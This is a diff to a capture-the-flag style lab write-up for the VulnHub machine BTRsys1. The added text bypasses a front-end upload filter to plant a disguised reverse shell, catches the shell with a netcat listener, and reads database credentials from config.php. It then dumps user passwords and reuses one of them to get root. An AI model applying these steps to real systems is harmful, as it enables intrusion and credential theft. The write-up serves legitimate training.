@@ -143,7 +143,7 @@ function getFile(){
 
 ## 3.Gaining Shell
 
-this code just prevents us from uploading files which does not have `jpg`, `gif` or `png` extensions.
+This code just prevents us from uploading files which does not have `jpg`, `gif` or `png` extensions.
 
 but frontend control mechanism can be bypassed by intercepting the traffic with a proxy like burp so prepare
 
@@ -151,9 +151,106 @@ a reverse shell and call the file `revshell.png`, intercept the traffic in burp 
 
 ![revshell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/14561d2e-280c-443c-b504-54d7bbf1173c)
 
+then start a listener and check the `/uploads` folder you see the file you've just uploaded and you gain a shell :
 
+```bash
+nc -nvlp 4444                     
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.236] 47464
+Linux BTRsys1 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
+ 00:30:40 up  1:32,  0 users,  load average: 0.00, 0.02, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
+## 4.Privilege Escalation
 
+Since nikto found `config.php` file, go to `/var/www/html` and cat the content of config.php :
 
+```text
+$ cat config.php
+<?php
+/////////////////////////////////////////////////////////////////////////////////////////
+$con=mysqli_connect("localhost","root","toor","deneme");
+if (mysqli_connect_errno())
+  {
+  echo "Mysql Bağlantı hatası!: " . mysqli_connect_error();
+  }
+/////////////////////////////////////////////////////////////////////////////////////////
+?>
+```
 
+you will see the username and password for mysql, now try to login to database from here (first stablize the shell) :
+
+```bash
+www-data@BTRsys1:/$ mysql -u root -h localhost -p
+mysql -u root -h localhost -p
+Enter password: toor
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 653
+Server version: 5.5.55-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| deneme             |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.00 sec)
+
+mysql> use deneme
+use deneme
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++------------------+
+| Tables_in_deneme |
++------------------+
+| user             |
++------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from user;
+select * from user;
++----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
+| ID | Ad_Soyad    | Kullanici_Adi    | Parola    | BabaAdi | BabaMeslegi | AnneAdi | AnneMeslegi | KardesSayisi |
++----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
+|  1 | ismail kaya | ikaya@btrisk.com | asd123*** | ahmet   | muhasebe    | nazli   | lokantaci   |            5 |
+|  2 | can demir   | cdmir@btrisk.com | asd123*** | mahmut  | memur       | gulsah  | tuhafiyeci  |            8 |
++----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
+2 rows in set (0.00 sec)
+```
+
+in `Parlo` column (which means password) we see a password, try to login to root acount with this password :
+
+```bash
+www-data@BTRsys1:/$ su root
+su root
+Password: asd123***
+
+root@BTRsys1:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+yes, this is how you can get root on this machine :)
 
